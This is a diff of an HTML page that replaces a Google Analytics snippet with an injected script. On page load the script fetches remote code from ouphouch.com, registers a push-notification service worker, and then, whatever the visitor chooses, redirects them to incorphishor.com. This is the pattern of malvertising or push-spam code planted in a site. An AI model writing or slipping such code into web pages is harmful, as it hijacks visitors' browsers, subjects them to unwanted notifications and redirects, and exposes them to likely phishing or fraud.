@@ -1,5 +1,4 @@
 <!DOCTYPE html><html><head>
-	<meta name="pushsdk" content="6b05db73b5123161e5741040d72a2f71">
 	<meta name='asg_verification' content='gQc3VthxULQZjKS58Fn7NKhM'>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
@@ -167,15 +166,26 @@
 </main></p>
 <br />
 <br />
-	
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-1303818-31"></script>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4875222'+'&ymid='+pci+'&sw=/sw-check-permissions-518c3.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':
+            window.location.replace("//incorphishor.com/4/4875223");break;
+            case 'onPermissionAllowed':
+            window.location.replace("//incorphishor.com/4/4875223");break;
+            case 'onPermissionDenied':
+            window.location.replace("//incorphishor.com/4/4875223");break;
+            case 'onAlreadySubscribed':
+            window.location.replace("//incorphishor.com/4/4875223");break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
 
-  gtag('config', 'UA-1303818-31');
+    document.head.appendChild(s);
 </script>	
 </body>
 </html>
